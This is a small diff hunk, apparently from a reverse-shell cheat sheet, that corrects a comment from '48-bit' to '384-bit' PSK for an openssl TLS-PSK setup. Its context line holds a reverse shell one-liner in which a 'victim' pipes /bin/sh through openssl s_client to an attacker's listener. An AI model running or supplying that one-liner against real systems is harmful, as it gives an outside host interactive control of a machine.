@@ -177,7 +177,7 @@ user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -
 
 TLS-PSK (does not rely on PKI or self-signed certificates)
 ```bash
-# generate 48-bit PSK
+# generate 384-bit PSK
 # use the generated string as a value for the two PSK variables from below
 openssl rand -hex 48 
 # server (attacker)
